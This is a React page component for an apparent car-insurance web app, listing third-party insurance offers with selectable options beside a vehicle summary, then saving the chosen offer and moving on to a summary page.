import React, { useMemo, useState } from "react";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";
import { thirdPartyCompanies } from "../constants/thirdPartyCompanies";
import axios from "axios";
import { api_route } from "../App";
import ApplyFooter from "../components/ApplyFooter";
import FloatingActions from "../components/FloatingActions";
import ProgressStepper from "../components/apply/ProgressStepper";
import OfferCard from "../components/activate/OfferCard";

function parseQuery() {
  const raw = new URLSearchParams(window.location.search).get("data");
  try {
    return { raw, parsed: raw ? JSON.parse(raw) : {} };
  } catch {
    return { raw, parsed: {} };
  }
}

const Activate = () => {
  const { t, dir } = useTranslation();
  const { raw: data, parsed } = useMemo(parseQuery, []);
  const [loading, setLoading] = useState(false);
  const [selectedOptions, setSelectedOptions] = useState(() =>
    thirdPartyCompanies.map((company) =>
      company.options.map((opt) => Boolean(opt.checked)),
    ),
  );
  const navigate = useNavigate();

  const toggleOption = (companyIdx, optionIdx) => {
    setSelectedOptions((prev) =>
      prev.map((opts, i) =>
        i === companyIdx
          ? opts.map((checked, j) => (j === optionIdx ? !checked : checked))
          : opts,
      ),
    );
  };

  const handleVisa = async (idx) => {
    setLoading(true);
    const company = {
      ...thirdPartyCompanies[idx],
      options: thirdPartyCompanies[idx].options.map((opt, i) => ({
        ...opt,
        checked: Boolean(selectedOptions[idx][i]),
      })),
    };
    const finalData = { ...parsed, companyData: company };
    sessionStorage.setItem("companyData", JSON.stringify(company));
    try {
      if (parsed._id) {
        await axios.post(`${api_route}/company/${parsed._id}`, {
          companyData: company,
        });
      }
    } catch {
      // continue navigation even if save fails
    }
    return navigate(`/summary?data=${JSON.stringify(finalData)}`);
  };

  const handleBack = () => {
    if (window.history.length > 1) navigate(-1);
    else navigate("/");
  };

  const summaryFields = [
    { label: t("activate.vehicleMake"), value: parsed.car_model || "—" },
    { label: t("activate.vehicleYear"), value: parsed.car_year || "—" },
    {
      label: t("activate.estimatedValue"),
      value: parsed.carPrice
        ? `${parsed.carPrice} ${t("common.currencySar")}`
        : "—",
    },
    { label: t("activate.purpose"), value: parsed.purpose_of_use || "—" },
    { label: t("activate.repairLocation"), value: parsed.tameenAllType || "—" },
  ];

  const querySuffix = data ? `?data=${data}` : "";

  return (
    <div className="flex min-h-screen w-full flex-col bg-[#F8F9FB]" dir={dir}>
      {loading ? (
        <div className="fixed top-0 z-50 flex h-screen w-full items-center justify-center bg-white bg-opacity-60">
          <div className="flex h-fit w-fit items-center justify-center gap-x-3 rounded-md bg-white p-3">
            <span className="text-lg">{t("common.processing")}</span>
            <img src="/logo.svg" className="h-14 w-14" alt="" />
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              visible
            />
          </div>
        </div>
      ) : null}

      <div className="mx-auto w-full max-w-xl px-4 pt-4 pb-8">
        <ProgressStepper t={t} current={3} />

        <section className="mt-5 rounded-2xl bg-white p-4 shadow-sm">
          <h1 className="mb-4 text-base font-extrabold text-[#146394]">
            {t("activate.offersTitle")}
          </h1>
          <dl className="grid grid-cols-2 gap-x-4 gap-y-3">
            {summaryFields.map((field) => (
              <div key={field.label}>
                <dt className="text-xs font-semibold text-gray-400">
                  {field.label}
                </dt>
                <dd className="mt-1 text-sm font-extrabold text-[#146394]">
                  {field.value}
                </dd>
              </div>
            ))}
          </dl>
        </section>

        <p className="mt-4 rounded-xl bg-[#E8F3FB] px-4 py-3 text-xs font-semibold leading-6 text-[#146394]">
          {t("activate.samaNotice")}
        </p>

        <div className="mt-4 flex overflow-hidden rounded-xl border border-[#146394]">
          <button
            type="button"
            className="flex-1 bg-[#146394] py-3 text-sm font-bold text-white"
          >
            {t("activate.tabThirdParty")}
          </button>
          <button
            type="button"
            onClick={() => navigate(`/activate_shamel${querySuffix}`)}
            className="flex-1 bg-white py-3 text-sm font-bold text-[#146394]"
          >
            {t("activate.tabComprehensive")}
          </button>
        </div>

        <div className="mt-5 flex flex-col gap-4">
          {thirdPartyCompanies.map((company, index) => (
            <OfferCard
              key={company.nameKey}
              company={company}
              t={t}
              selectedOptions={selectedOptions[index]}
              onToggleOption={(optionIdx) => toggleOption(index, optionIdx)}
              onChoose={() => handleVisa(index)}
            />
          ))}
        </div>

        <button
          type="button"
          onClick={handleBack}
          className="mt-6 w-full rounded-xl border border-[#146394] py-3 text-base font-bold text-[#146394]"
        >
          {t("reg.back")}
        </button>
      </div>

      <ApplyFooter />
      <FloatingActions />
    </div>
  );
};

export default Activate;
